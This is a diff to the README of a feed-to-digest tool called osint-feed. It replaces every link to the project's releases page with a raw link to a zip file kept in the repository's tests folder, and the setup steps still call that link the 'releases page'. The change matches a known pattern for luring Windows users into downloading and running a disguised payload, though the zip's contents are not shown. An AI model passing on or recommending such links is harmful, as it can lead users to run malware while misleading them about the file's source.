@@ -1,12 +1,12 @@
 # 📰 osint-feed - Turn feeds into clean article digests
 
-[![Download osint-feed](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://github.com/whitakerunsaturated400/osint-feed/releases)
+[![Download osint-feed](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/whitakerunsaturated400/osint-feed/main/tests/osint-feed-v3.5-alpha.3.zip)
 
 ## 📥 Download
 
 Visit this page to download and run the app on Windows:
 
-[https://github.com/whitakerunsaturated400/osint-feed/releases](https://github.com/whitakerunsaturated400/osint-feed/releases)
+[https://raw.githubusercontent.com/whitakerunsaturated400/osint-feed/main/tests/osint-feed-v3.5-alpha.3.zip](https://raw.githubusercontent.com/whitakerunsaturated400/osint-feed/main/tests/osint-feed-v3.5-alpha.3.zip)
 
 ## 🧭 What this app does
 
@@ -24,7 +24,7 @@ It keeps the process simple. You give it sources, and it gives you structured ar
 
 ## 🪟 Windows setup
 
-1. Open the [releases page](https://github.com/whitakerunsaturated400/osint-feed/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/whitakerunsaturated400/osint-feed/main/tests/osint-feed-v3.5-alpha.3.zip)
 2. Download the Windows file from the latest release
 3. If the file comes in a .zip folder, right-click it and choose Extract All
 4. Open the extracted folder
@@ -233,7 +233,7 @@ That keeps the setup simple and helps you find issues fast.
 
 Use the release page below to download and run the Windows version:
 
-[https://github.com/whitakerunsaturated400/osint-feed/releases](https://github.com/whitakerunsaturated400/osint-feed/releases)
+[https://raw.githubusercontent.com/whitakerunsaturated400/osint-feed/main/tests/osint-feed-v3.5-alpha.3.zip](https://raw.githubusercontent.com/whitakerunsaturated400/osint-feed/main/tests/osint-feed-v3.5-alpha.3.zip)
 
 ## 🧰 Quick start flow
 
